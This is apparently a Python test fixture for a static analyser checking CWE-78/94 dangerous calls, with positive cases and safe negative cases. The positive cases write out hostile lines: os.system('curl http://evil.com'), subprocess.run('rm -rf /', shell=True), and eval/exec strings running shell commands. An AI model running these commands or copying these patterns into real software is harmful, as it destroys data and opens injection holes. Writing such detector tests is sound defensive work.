"""行业标准 CWE-78/94 危险函数测试"""
import os
import subprocess
import shutil
import pickle
import yaml
import marshal
import shelve
import io
import ctypes

# ========== 真阳性 ==========
def pos_eval():
    eval("__import__(\"os\").system(\"id\")")

def pos_exec():
    exec("import os; os.system('id')")

def pos_pickle_loads():
    pickle.loads(b"coded_data")

def pos_pickle_load():
    pickle.load(io.BytesIO(b"data"))

def pos_marshal_loads():
    marshal.loads(b"coded_data")

def pos_marshal_load():
    marshal.load(io.BytesIO(b"data"))

def pos_shelve_open():
    s = shelve.open("data.db", writeback=True)
    s.close()

def pos_yaml_load():
    yaml.load("key: value", Loader=yaml.Loader)

def pos_os_system():
    os.system("curl http://evil.com")

def pos_os_popen():
    os.popen("ls -la")

def pos_subprocess_run_shell():
    subprocess.run("rm -rf /", shell=True)

def pos_subprocess_getoutput():
    subprocess.getoutput("ls -la")

def pos_ctypes_cdll():
    libc = ctypes.CDLL("libc.so.6")

def pos_shutil_rmtree():
    shutil.rmtree("/tmp/user_dir")

def pos_input():
    user_input = input()

# ========== 真阴性 ==========
def neg_subprocess_no_shell():
    subprocess.run(["ls", "-la"], shell=False, capture_output=True)

def neg_safe_loads():
    yaml.safe_load("key: value")

def neg_pickle_dump():
    pickle.dumps({"a": 1})

def neg_normal_functions():
    print("safe")
    len([1, 2, 3])
    str(42)
    open("file.txt", "r")
